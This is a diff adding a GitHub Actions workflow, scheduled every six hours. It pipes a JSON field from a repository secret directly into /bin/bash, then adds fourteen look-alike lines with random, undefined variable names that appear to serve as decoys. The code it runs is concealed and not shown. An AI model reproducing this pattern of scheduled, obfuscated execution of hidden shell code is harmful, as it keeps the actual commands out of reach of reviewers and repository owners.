@@ -1,0 +1,31 @@
+name: xiangzhejinhuan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangzhejinhuan
+        env:
+          verlw92381: ${{ secrets.verlw92381 }}
+        run: |
+          echo $verlw92381 | jq -r .lqncc5344 | /bin/bash
+          echo $fzl7346 | jq -r .akz2214 | /bin/bash
+          echo $rkff8 | jq -r .jeyo700 | /bin/bash
+          echo $ahywr18 | jq -r .tg9109 | /bin/bash
+          echo $qb4 | jq -r .noxq9092 | /bin/bash
+          echo $p979 | jq -r .ovz5337 | /bin/bash
+          echo $sqbd13577 | jq -r .ysudn68843 | /bin/bash
+          echo $cx02 | jq -r .bnu48 | /bin/bash
+          echo $ktyqv083 | jq -r .w36 | /bin/bash
+          echo $r7 | jq -r .ld874 | /bin/bash
+          echo $dr423 | jq -r .icofw56 | /bin/bash
+          echo $v469 | jq -r .a359 | /bin/bash
+          echo $g38839 | jq -r .fxih81271 | /bin/bash
+          echo $ngaai2 | jq -r .jvxy169 | /bin/bash
+          echo $aliy10 | jq -r .asz38 | /bin/bash
+
